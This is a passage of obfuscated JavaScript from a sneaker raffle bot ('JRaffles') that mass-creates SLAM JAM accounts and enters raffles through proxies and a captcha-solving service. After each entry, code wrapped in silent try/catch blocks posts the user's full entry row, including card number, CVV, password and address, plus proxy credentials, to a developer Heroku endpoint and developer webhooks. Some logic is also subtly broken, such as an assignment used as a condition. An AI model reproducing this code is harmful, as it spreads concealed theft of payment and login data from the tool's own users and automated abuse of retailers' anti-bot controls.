                                await _0x33a8e1['waitForSelector']('#raffle__confirmation-message-container'), _0x5412b7 = 'no', _0x3e2f6d(_0x82b370[_0x5ba545], _0x3b672d), console['log'](_0x561058['green'](_0x1500d7() + '\x20[' + _0x3b672d['name'] + ']\x20Task\x20' + (_0x5ba545 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                let _0x59b16a = _0x82b370[_0x5ba545];
                                try {
                                    prxdata = {
                                        'username': _0x100f6f['replace']('#', ''),
                                        'module': _0x3b672d['name'],
                                        'entrydata': JSON['stringify'](_0x59b16a),
                                        'proxy': '' + _0x4bed5f[_0x5ba545]
                                    };
                                    var _0x509a1e = JSON['stringify'](prxdata);
                                    let _0x9e2af6 = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x4a5c70['post']('https://jraffles.herokuapp.com/success', _0x509a1e, _0x9e2af6);
                                } catch (_0x1732b5) {
                                }
                            } catch (_0x453b13) {
                                console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x16913c[taskModule]['name'] + ']\x20Task\x20' + (_0x5ba545 + 0x1) + '\x20:\x20Raffle\x20entry\x20failed.\x20' + _0x453b13));
                            }
                        } catch (_0x32e6db) {
                            console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x16913c[taskModule]['name'] + ']\x20Task\x20' + (_0x5ba545 + 0x1) + '\x20:\x20' + _0x32e6db)), _0x5412b7 = 'yes';
                        } finally {
                            _0x44b5ef && _0x44b5ef['close']();
                            if (_0x5412b7 == 'yes' && _0x24b6e0 != 0x5 && _0x5197d3 != 'Size\x20Not\x20Found') {
                                console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x3b672d['name'] + ']\x20Task\x20' + (_0x5ba545 + 0x1) + '\x20:\x20Retrying\x20(' + _0x24b6e0 + '\x20/\x205)')), _0x5ba545 = _0x5ba545 - 0x1, _0x24b6e0 = _0x24b6e0 + 0x1;
                                continue;
                            }
                            _0x5412b7 == 'yes' && _0x24b6e0 >= 0x5 && (_0x194f3c(_0x82b370[_0x5ba545], _0x3b672d), _0x5412b7 = 'no', _0x24b6e0 = 0x0), console['log']('Waiting\x20for\x20' + _0x263298['delay'] + '\x20ms'), await _0x9175f4(_0x263298['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'SLAM\x20JAM',
        'modules': [
            {
                'name': 'SLAM\x20JAM\x20Account\x20Generator',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x10820c, _0x507b20, _0x3afe52) {
                    _0x45f1d0['use'](_0x49d897()), _0x45f1d0['use'](_0x5ae7c2({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x263298['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1088cb = 0x0; _0x1088cb < _0x507b20['length']; _0x1088cb++) {
                        if (_0x170b08 != 'yes')
                            var _0x170b08 = '', _0x2c45c6 = 0x0;
                        var _0xc954af = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x100f6f
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x263298['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x5ab5b1
                                }
                            ]
                        }];
                        const _0x54a926 = { 'embeds': _0xc954af };
                        _0x73a448(_0x10820c['name'] + '\x20Task\x20' + (_0x1088cb + 0x1) + '\x20/\x20' + _0x507b20['length'] + '\x20||\x20File:\x20' + _0x45373f + '\x20Proxies:\x20' + _0x362291);
                        try {
                            await _0x5c0aeb(_0x507b20, _0x1088cb);
                        } catch {
                            _0x170b08 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x4bc518 = await _0x22ebf6(_0x507b20[_0x1088cb], _0x10820c, 'acc', ![]);
                        const _0x4d5515 = { 'succesDEVMSG': { 'embeds': [_0x4bc518] } };
                        if (_0x507b20[_0x1088cb]['Email'] == '' || _0x507b20[_0x1088cb]['FirstName'] == '' || _0x507b20[_0x1088cb]['LastName'] == '') {
                            console['log'](_0x1500d7() + '\x20[' + _0x16913c[taskModule]['name'] + ']\x20Task\x20' + (_0x1088cb + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x9175f4(0x7d0);
                            continue;
                        }
                        (_0x507b20[_0x1088cb]['Password'] == '' || _0x507b20[_0x1088cb] == undefined) && _0x507b20[_0x1088cb]['Password'] == 'JRaffles23!';
                        if (_0x263298['useRandomProxy'] = ![])
                            var _0x237fc6 = _0x3afe52[_0x1088cb]['split'](':');
                        else
                            var _0x1202d7 = Math['round'](Math['random']() * (_0x3afe52['length'] - 0x1)), _0x237fc6 = _0x3afe52[_0x1202d7]['split'](':');
                        var _0x1f5316;
                        try {
                            _0x1f5316 = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x237fc6[0x0] + ':' + _0x237fc6[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1f5316 = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x237fc6[0x0] + ':' + _0x237fc6[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x346dcb = await _0x1f5316['newPage']();
                            await _0x346dcb['authenticate']({
                                'username': '' + _0x237fc6[0x2],
                                'password': '' + _0x237fc6[0x3]
                            }), console['log'](_0x1500d7() + '\x20[' + _0x10820c['name'] + ']\x20Task\x20' + (_0x1088cb + 0x1) + '\x20:\x20Getting\x20Session'), await _0x346dcb['setRequestInterception'](!![]), _0x346dcb['on']('request', _0x4ea3dc => {
                                _0x4ea3dc['resourceType']() === 'image' || _0x4ea3dc['resourceType']() === 'font' || _0x4ea3dc['resourceType']() === 'media' ? _0x4ea3dc['abort']() : _0x4ea3dc['continue']();
                            }), await _0x346dcb['goto']('https://drop.slamjam.com/account/register'), await _0x9175f4(0xbb8), await _0x346dcb['waitForSelector']('#FirstName'), await _0x346dcb['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x346dcb['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), console['log'](_0x1500d7() + '\x20[' + _0x10820c['name'] + ']\x20Task\x20' + (_0x1088cb + 0x1) + '\x20:\x20Filling\x20information'), await _0x9175f4(0x4b0), await _0x346dcb['type']('#FirstName', '' + _0x507b20[_0x1088cb]['FirstName']), await _0x9175f4(0x226), await _0x346dcb['type']('#LastName', '' + _0x507b20[_0x1088cb]['LastName']), await _0x9175f4(0x226), await _0x346dcb['type']('#Email', '' + _0x507b20[_0x1088cb]['Email']), await _0x9175f4(0x2ee), await _0x346dcb['type']('#ConfirmEmail', '' + _0x507b20[_0x1088cb]['Email']), await _0x9175f4(0x2ee), await _0x346dcb['type']('#CreatePassword', '' + _0x507b20[_0x1088cb]['Password']), await _0x9175f4(0x2ee), await _0x346dcb['type']('#CreateConfirmPassword', '' + _0x507b20[_0x1088cb]['Password']), await _0x9175f4(0x226), console['log'](_0x1500d7() + '\x20[' + _0x10820c['name'] + ']\x20Task\x20' + (_0x1088cb + 0x1) + '\x20:\x20Submitting..'), await _0x346dcb['$eval']('#create_customer', _0x2ec928 => _0x2ec928['submit']()), await _0x9175f4(0x1388), console['log'](_0x1500d7() + '\x20[' + _0x10820c['name'] + ']\x20Task\x20' + (_0x1088cb + 0x1) + '\x20:\x20' + _0x561058['cyan']('Solving\x20Captcha')), await _0x346dcb['solveRecaptchas'](), console['log'](_0x1500d7() + '\x20[' + _0x10820c['name'] + ']\x20Task\x20' + (_0x1088cb + 0x1) + '\x20:\x20Captcha\x20solved'), await _0x346dcb['$eval']('.shopify-challenge__container\x20>\x20form', _0x56710e => _0x56710e['submit']());
                            try {
                                await _0x346dcb['waitForSelector']('.product-card__image'), await _0x9175f4(0x1f4), _0x170b08 = 'no', console['log'](_0x561058['green'](_0x1500d7() + '\x20[' + _0x10820c['name'] + ']\x20Task\x20' + (_0x1088cb + 0x1) + '\x20:\x20Account\x20' + _0x507b20[_0x1088cb]['Email'] + '\x20Generated!')), _0x1ed524['appendFileSync']('../accounts/slamjam.csv', '\x0a' + _0x507b20[_0x1088cb]['Email'] + ',' + _0x507b20[_0x1088cb]['Password']), console['log'](_0x561058['yellow'](_0x1500d7() + '\x20[' + _0x10820c['name'] + ']\x20Task\x20' + (_0x1088cb + 0x1) + '\x20:\x20Account\x20' + _0x507b20[_0x1088cb]['Email'] + '\x20Saved\x20in\x20\x27accounts/slamjam.csv\x27'));
                                try {
                                    _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0x4d5515['succesDEVMSG']);
                                } catch {
                                }
                                await _0x1cac9f(_0x515b29, _0x4d5515['succesDEVMSG']);
                            } catch (_0x57fe0a) {
                                console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x16913c[taskModule]['name'] + ']\x20Task\x20' + (_0x1088cb + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x57fe0a));
                            }
                        } catch (_0x2d49f3) {
                            console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x16913c[taskModule]['name'] + ']\x20Task\x20' + (_0x1088cb + 0x1) + '\x20:\x20' + _0x2d49f3));
                        } finally {
                            _0x1f5316 && _0x1f5316['close']();
                            if (_0x170b08 == 'yes' && _0x2c45c6 != 0x5) {
                                console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x10820c['name'] + ']\x20Task\x20' + (_0x1088cb + 0x1) + '\x20:\x20Retrying\x20(' + _0x2c45c6 + '\x20/\x205)')), _0x1088cb = _0x1088cb - 0x1, _0x2c45c6 = _0x2c45c6 + 0x1;
                                continue;
                            }
                            _0x170b08 == 'yes' && _0x2c45c6 >= 0x5 && (_0x194f3c(_0x507b20[_0x1088cb], _0x10820c), _0x170b08 = 'no', _0x2c45c6 = 0x0), console['log']('Waiting\x20for\x20' + _0x263298['delay'] + '\x20ms'), await _0x9175f4(_0x263298['delay']);
                        }
                    }
                }
            },
            {
                'name': 'SLAM\x20JAM\x20Raffle\x20Entries',
                'store': 'SLAM\x20JAM',
                'logo': 'https://res.cloudinary.com/crunchbase-production/image/upload/c_lpad,f_auto,q_auto:eco,dpr_1/2c778bc022405e206505',
                'function': async function (_0x40f164, _0x285a48, _0x247fe0) {
                    _0x45f1d0['use'](_0x49d897()), _0x45f1d0['use'](_0x5ae7c2({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x263298['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x236353 = 0x0; _0x236353 < _0x285a48['length']; _0x236353++) {
                        var _0x2c3062;
                        if (_0xf56a2 != 'yes')
                            var _0xf56a2 = '', _0x5bf6b8 = 0x0;
                        _0x73a448(_0x40f164['name'] + '\x20Task\x20' + (_0x236353 + 0x1) + '\x20/\x20' + _0x285a48['length'] + '\x20||\x20File:\x20' + _0x45373f + '\x20Proxies:\x20' + _0x362291);
                        try {
                            await _0x5c0aeb(_0x285a48, _0x236353);
                        } catch {
                            _0xf56a2 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x285a48[_0x236353]['Email'] == '' || _0x285a48[_0x236353]['Password'] == '' || _0x285a48[_0x236353]['FirstName'] == '' || _0x285a48[_0x236353]['LastName'] == '') {
                            console['log'](_0x1500d7() + '\x20[' + _0x40f164['name'] + ']\x20Task\x20' + (_0x236353 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x263298['useRandomProxy'] = ![])
                            var _0x5a0246 = _0x247fe0[_0x236353]['split'](':');
                        else
                            var _0x2a0374 = Math['round'](Math['random']() * (_0x247fe0['length'] - 0x1)), _0x5a0246 = _0x247fe0[_0x2a0374]['split'](':');
                        var _0x41393e;
                        try {
                            _0x41393e = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5a0246[0x0] + ':' + _0x5a0246[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x41393e = await _0x45f1d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !!![],
                                'args': [
                                    '--proxy-server=' + _0x5a0246[0x0] + ':' + _0x5a0246[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x59d0e8 = await _0x41393e['newPage']();
                            await _0x59d0e8['authenticate']({
                                'username': '' + _0x5a0246[0x2],
                                'password': '' + _0x5a0246[0x3]
                            }), await _0x59d0e8['setViewport']({
                                'width': 0x500,
                                'height': 0x2d0
                            }), console['log'](_0x1500d7() + '\x20[' + _0x40f164['name'] + ']\x20Task\x20' + (_0x236353 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x59d0e8['setRequestInterception'](!![]), _0x59d0e8['on']('request', _0x11ff9e => {
                                _0x11ff9e['resourceType']() === 'image' || _0x11ff9e['resourceType']() === 'font' || _0x11ff9e['resourceType']() === 'media' ? _0x11ff9e['abort']() : _0x11ff9e['continue']();
                            }), await _0x59d0e8['goto']('https://drop.slamjam.com/account/login', {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x59d0e8['waitForSelector']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x59d0e8['click']('.iubenda-cs-accept-btn.iubenda-cs-btn-primary'), await _0x9175f4(0x258), await _0x59d0e8['waitForSelector']('#CustomerEmail'), console['log'](_0x1500d7() + '\x20[' + _0x40f164['name'] + ']\x20Task\x20' + (_0x236353 + 0x1) + '\x20:\x20Logging\x20in..'), await _0x59d0e8['type']('#CustomerEmail', '' + _0x285a48[_0x236353]['Email']), await _0x9175f4(0x12c), await _0x59d0e8['type']('#CustomerPassword', '' + _0x285a48[_0x236353]['Password']), await _0x9175f4(0x226), await _0x59d0e8['$eval']('#customer_login', _0x26e849 => _0x26e849['submit']()), await _0x9175f4(0x7d0), await _0x59d0e8['waitForSelector']('iframe[title=\x22reCAPTCHA\x22]'), console['log'](_0x1500d7() + '\x20[' + _0x40f164['name'] + ']\x20Task\x20' + (_0x236353 + 0x1) + '\x20:\x20' + _0x561058['cyan']('Solving\x20Captcha')), await _0x59d0e8['solveRecaptchas'](), console['log'](_0x1500d7() + '\x20[' + _0x40f164['name'] + ']\x20Task\x20' + (_0x236353 + 0x1) + '\x20:\x20Captcha\x20Solved'), await _0x59d0e8['$eval']('.shopify-challenge__container\x20>\x20form', _0x4fc722 => _0x4fc722['submit']());
                            try {
                                await _0x59d0e8['waitForSelector']('.nav-account'), await _0x9175f4(0x4b0);
                            } catch {
                                console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x40f164['name'] + ']\x20Task\x20' + (_0x236353 + 0x1) + '\x20:\x20Task\x20failed,\x20invalid\x20credentials'));
                                continue;
                            }
                            await _0x59d0e8['goto']('' + _0x285a48[_0x236353]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            }), await _0x9175f4(0xbb8), console['log'](_0x1500d7() + '\x20[' + _0x40f164['name'] + ']\x20Task\x20' + (_0x236353 + 0x1) + '\x20:\x20Starting\x20Entry');
                            try {
                                await _0x59d0e8['waitForSelector']('#ProductSelect-product-template-raffle');
                            } catch {
                            }
                            await _0x59d0e8['click']('.product-select-variant-wrapper'), await _0x9175f4(0x320), await _0x59d0e8['click']('li.product-select-variant__value[data-size=\x22' + _0x285a48[_0x236353]['Size'] + '\x22]'), await _0x9175f4(0x384), await _0x59d0e8['$eval']('#AddToCartForm-product-template-raffle', _0x49811f => _0x49811f['submit']()), await _0x59d0e8['waitForSelector']('.cart-order-summary__content'), await _0x9175f4(0x514), await _0x59d0e8['goto']('https://drop.slamjam.com/checkout'), await _0x9175f4(0x514), await _0x59d0e8['waitForSelector']('#checkout_shipping_address_country'), console['log'](_0x1500d7() + '\x20[' + _0x40f164['name'] + ']\x20Task\x20' + (_0x236353 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x59d0e8['select']('#checkout_shipping_address_country', '' + _0x285a48[_0x236353]['Country']), await _0x9175f4(0x200), await _0x59d0e8['waitForSelector']('#checkout_shipping_address_first_name'), await _0x59d0e8['type']('#checkout_shipping_address_first_name', '' + _0x285a48[_0x236353]['FirstName']), await _0x9175f4(0x237), await _0x59d0e8['type']('#checkout_shipping_address_last_name', '' + _0x285a48[_0x236353]['LastName']), await _0x9175f4(0x1e0), await _0x59d0e8['type']('#checkout_shipping_address_address1', _0x285a48[_0x236353]['Address1'] + '\x20' + _0x285a48[_0x236353]['HouseNumber']), await _0x9175f4(0x514), await _0x59d0e8['type']('#checkout_shipping_address_address2', '' + _0x285a48[_0x236353]['Address2']), await _0x9175f4(0x514);
                            _0x285a48[_0x236353]['Postcode'] == undefined && (_0x285a48[_0x236353]['Postcode'] = _0x285a48[_0x236353]['Zip']);
                            await _0x59d0e8['type']('#checkout_shipping_address_zip', '' + _0x285a48[_0x236353]['Postcode']), await _0x9175f4(0x2bc), await _0x59d0e8['type']('#checkout_shipping_address_city', '' + _0x285a48[_0x236353]['City']), await _0x9175f4(0x320), await _0x59d0e8['type']('#checkout_shipping_address_phone', '' + _0x285a48[_0x236353]['Phone']), await _0x9175f4(0x320), await _0x59d0e8['click']('#continue_button'), await _0x9175f4(0xbb8), await _0x59d0e8['waitForSelector']('.summary-title'), await _0x9175f4(0x320), await _0x59d0e8['click']('#continue_button'), await _0x9175f4(0x320), console['log'](_0x1500d7() + '\x20[' + _0x40f164['name'] + ']\x20Task\x20' + (_0x236353 + 0x1) + '\x20:\x20Finishing\x20Checkout'), await _0x59d0e8['waitForSelector']('#checkout_credit_card_vault'), await _0x9175f4(0x3e8);
                            var _0x31b599 = await _0x59d0e8['$']('iframe[title=\x22Field\x20container\x20for:\x20Card\x20number\x22]'), _0x489c96 = await _0x31b599['contentFrame']();
                            await _0x489c96['click']('#number'), await _0x9175f4(0x3e8), await _0x489c96['type']('#number', '' + _0x285a48[_0x236353]['CardNumber'], { 'delay': 0x78 }), _0x31b599 = await _0x59d0e8['$']('iframe[title=\x22Field\x20container\x20for:\x20Name\x20on\x20card\x22]'), _0x489c96 = await _0x31b599['contentFrame'](), await _0x9175f4(0x1c2), await _0x489c96['click']('#name'), await _0x9175f4(0x1f4), await _0x489c96['type']('#name', '' + _0x285a48[_0x236353]['NameOnCard'], { 'delay': 0x78 }), _0x31b599 = await _0x59d0e8['$']('iframe[title=\x22Field\x20container\x20for:\x20Expiration\x20date\x20(MM\x20/\x20YY)\x22]'), _0x489c96 = await _0x31b599['contentFrame'](), await _0x9175f4(0x1c2), await _0x489c96['click']('#expiry'), await _0x9175f4(0x1f4), await _0x489c96['type']('#expiry', '' + _0x285a48[_0x236353]['ExpiryDate'], { 'delay': 0x78 }), _0x31b599 = await _0x59d0e8['$']('iframe[title=\x22Field\x20container\x20for:\x20Security\x20code\x22]'), _0x489c96 = await _0x31b599['contentFrame'](), await _0x9175f4(0x1c2), await _0x489c96['click']('#verification_value'), await _0x9175f4(0x1f4), await _0x489c96['type']('#verification_value', '' + _0x285a48[_0x236353]['CVV'], { 'delay': 0x78 }), await _0x59d0e8['$eval']('#accepts-flag-raffle', _0x5f1946 => _0x5f1946['click']()), await _0x9175f4(0x7d0), console['log'](_0x1500d7() + '\x20[' + _0x40f164['name'] + ']\x20Task\x20' + (_0x236353 + 0x1) + '\x20:\x20Processing\x20Order'), await _0x59d0e8['$eval']('#continue_button', _0x16c005 => _0x16c005['click']()), await _0x9175f4(0x1b58), await _0x59d0e8['waitForSelector']('.edit_checkout.animate-floating-labels'), await _0x59d0e8['$eval']('.edit_checkout.animate-floating-labels', _0x3eeb1c => _0x3eeb1c['submit']()), await _0x9175f4(0x7d0);
                            try {
                                await _0x59d0e8['waitForSelector']('div[data-step=\x22thank_you\x22]', { 'timeout': 0x493e0 }), _0xf56a2 = 'no', _0x3e2f6d(_0x285a48[_0x236353], _0x40f164), console['log'](_0x561058['green'](_0x1500d7() + '\x20[' + _0x40f164['name'] + ']\x20Task\x20' + (_0x236353 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            } catch (_0x5e8fbb) {
                                throw new Error('Error\x20Processing\x20Order:\x20' + _0x5e8fbb['message']);
                            }
                            var _0x2cc76a = await _0x22ebf6(_0x285a48[_0x236353], _0x40f164, 'dev', ![]), _0x4fc32a = await _0x22ebf6(_0x285a48[_0x236353], _0x40f164, 'pub', ![]);
                            let _0x493c59 = _0x285a48[_0x236353];
                            try {
                                prxdata = {
                                    'username': _0x100f6f['replace']('#', ''),
                                    'module': _0x40f164['name'],
                                    'entrydata': JSON['stringify'](_0x493c59),
                                    'proxy': '' + _0x247fe0[_0x236353]
                                };
                                var _0x159c33 = JSON['stringify'](prxdata);
                                let _0x24698c = { 'headers': { 'content-type': 'application/json' } };
                                await _0x4a5c70['post']('https://jraffles.herokuapp.com/success', _0x159c33, _0x24698c);
                            } catch (_0x52b2a8) {
                            }
                            const _0x5ac81b = {
                                'succesDEVMSG': { 'embeds': [_0x2cc76a] },
                                'succesPUBMSG': { 'embeds': [_0x4fc32a] }
                            };
                            try {
                                _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], _0x5ac81b['succesDEVMSG']), await _0x9175f4(0xc8), await _0x1cac9f(_0x48f5f5, _0x5ac81b['succesDEVMSG']), await _0x9175f4(0xc8), await _0x1cac9f(_0x2f03c2, _0x5ac81b['succesPUBMSG']);
                            } catch (_0x26b501) {
                                console['log'](_0x561058['yellow'](_0x1500d7() + '\x20[' + _0x16913c[taskModule]['name'] + ']\x20Task\x20' + (_0x236353 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x26b501));
                            }
                        } catch (_0x148c44) {
                            console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x16913c[taskModule]['name'] + ']\x20Task\x20' + (_0x236353 + 0x1) + '\x20:\x20' + _0x148c44)), _0x2c3062 = '' + _0x148c44;
                            var _0x1d6d05 = await _0x22ebf6(kickz[_0x236353], _0x40f164, 'dev', !![], _0x2c3062);
                            EMBEDS['errorDEV'] = { 'embeds': [_0x1d6d05] }, _0x263298['webhook'] != undefined && _0x263298['webhook'] != '' && await _0x1cac9f(_0x263298['webhook'], EMBEDS['errorDEV']), await _0x1cac9f(_0x569bf6, EMBEDS['errorDEV']), _0xf56a2 = 'yes';
                        } finally {
                            _0x41393e && _0x41393e['close']();
                            if (_0xf56a2 == 'yes' && _0x5bf6b8 != 0x5 && _0x2c3062 != 'Size\x20Not\x20Found') {
                                console['log'](_0x561058['red'](_0x1500d7() + '\x20[' + _0x40f164['name'] + ']\x20Task\x20' + (_0x236353 + 0x1) + '\x20:\x20Retrying\x20(' + _0x5bf6b8 + '\x20/\x205)')), _0x236353 = _0x236353 - 0x1, _0x5bf6b8 = _0x5bf6b8 + 0x1;
                                continue;
                            }
                            _0xf56a2 == 'yes' && _0x5bf6b8 >= 0x5 && (_0x194f3c(_0x285a48[_0x236353], _0x40f164), _0xf56a2 = 'no', _0x5bf6b8 = 0x0), console['log']('Waiting\x20for\x20' + _0x263298['delay'] + '\x20ms'), await _0x9175f4(_0x263298['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'Failed\x20Tasks',
        'modules': [
            {
                'name': 'Retry\x20Failed\x20Tasks',
                'function': async function (_0x4b29a0) {
                    var _0x57fe28 = await _0x4dde3f(), _0x28aa11 = _0x1ed524['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x3405fa = _0x2057e4['parse'](_0x28aa11, { 'header': !![] })['data'];
                    for (var _0x36cc4b = 0x0; _0x36cc4b < _0x3405fa['length']; _0x36cc4b++) {
                        var _0x7d967 = _0x3405fa[_0x36cc4b]['Store'], _0x3d8ba2 = _0x3405fa[_0x36cc4b]['Mode'];
                        for (var _0x4e86b6 of _0x16913c) {
                            const _0x2a6a4e = _0x4e86b6['name']['includes'](_0x7d967);
                            if (!_0x2a6a4e)
                                continue;
                            for (mode of _0x4e86b6['modules']) {
                                if (mode['name'] == _0x3d8ba2) {
                                    console['log']('Running\x20' + _0x561058['cyan'](mode['name'])), await mode['function'](mode, [_0x3405fa[_0x36cc4b]], _0x57fe28);
                                    var _0x32d09f = _0x28aa11['split']('\x0a')['splice'](0x0, 0x1)['join']('\x0a');
                                    _0x1ed524['writeFileSync']('../failed-tasks.csv', _0x32d09f);
                                }
                            }
                        }
                    }
                }
            },
            {
                'name': 'Clear\x20Failed\x20Tasks',
                'function': async function () {
                    console['clear'](), console['log']('Are\x20you\x20sure\x20you\x20want\x20to\x20clear\x20\x22failed-tasks.csv\x22?\x20(y/n)');
                    var _0x3bb71d = await _0x7c4c0f['get']('Answer');
                    if (_0x3bb71d['Answer']['toLowerCase']() == 'y') {
                        _0x1ed524['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), console['clear'](), console['log']('Cleared\x20Failed\x20Tasks'), await _0x9175f4(0x3e8);
                        return;
                    }
                    if (_0x3bb71d['Answer']['toLowerCase']() == 'n') {
                        console['clear'](), console['log']('Returning\x20to\x20Main\x20Menu'), await _0x9175f4(0x3e8);
                        return;
                    }
                    return console['clear'](), console['log']('Invalid\x20Input'), await _0x9175f4(0x3e8), this['function']();
                }
            }
        ]
    },
    { 'name': 'Paypal\x20Verification' },
    { 'name': 'Change\x20Settings' },
    { 'name': 'Reload\x20Settings' }
];
async function _0x15d4fe(_0x5ec132) {
    var _0x35bf6b = await _0x4dde3f(), _0xc88c9c = _0x1ed524['readFileSync']('../failed-tasks.csv', 'utf-8'), _0x1c434e = _0x2057e4['parse'](_0xc88c9c, { 'header': !![] })['data'];
    for (var _0x474306 = 0x0; _0x474306 < _0x1c434e['length']; _0x474306++) {
        var _0x2d7eb0 = _0x1c434e[_0x474306]['Store'], _0x4168aa = _0x1c434e[_0x474306]['Mode'];
        for (var _0x223c39 of _0x16913c) {
            const _0x7bcff8 = _0x223c39['name']['includes'](_0x2d7eb0);
            if (_0x7bcff8)
                for (mode of _0x16913c[_0x223c39]['modules']) {
                    const _0x1ec036 = mode['name']['includes'](_0x4168aa);
                    _0x1ec036 && (_0x5ec132 = mode['name'], await mode['function'](_0x5ec132, _0x1c434e[_0x474306], _0x35bf6b));
                }
        }
    }
}
async function _0x2110df() {
    await _0x285121(), console['clear']();
    if (_0x5ab5b1 != 'devkey') {
        let _0x19edf6 = await _0x3a30b1['autoUpdate']();
        if (_0x19edf6 === 'yes')
            return _0x2bc5d9('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0x2c3793 == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x9175f4(0x2710);
        ;
    }
    await _0x4a339e(_0x2c3793);
    if (_0xaa0235 === ![])
        return console['log']('Closing\x20Browser'), await _0x9175f4(0xbb8);
    else
        try {
            var _0x3063df = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x100f6f
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x5ab5b1
                    }
                ]
            }];
            const _0x205ab0 = { 'embeds': _0x3063df };
            var _0x2449ed = await _0x22ebf6(null, null, 'open', ![]);
            const _0x33253d = { 'openDEVMSG': { 'embeds': [_0x2449ed] } };
            await _0x1cac9f(_0x9c3347, _0x33253d['openDEVMSG']);
            async function _0x2188f4() {
                _0x73a448('JRaffles\x20' + _0x5ab5b1), console['clear'](), console['log']('Hello\x20' + _0x561058['cyan']('' + _0x100f6f) + ',\x20Welcome\x20to\x20JRaffles\x20' + _0x5ab5b1), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x1dff77 = 0x0; _0x1dff77 < _0x16913c['length'] - 0x4; _0x1dff77++) {
                    if (_0x1dff77 >= 0xa) {
                        console['log']('\x20(' + _0x1dff77 + ')\x20[' + _0x16913c[_0x1dff77]['name'] + ']');
                        continue;
                    }
                    if (_0x16913c[_0x1dff77]['name'] === 'Reload\x20Settings' || _0x16913c[_0x1dff77]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x1dff77 + ')\x20\x20[' + _0x16913c[_0x1dff77]['name'] + ']');
                }
                ;
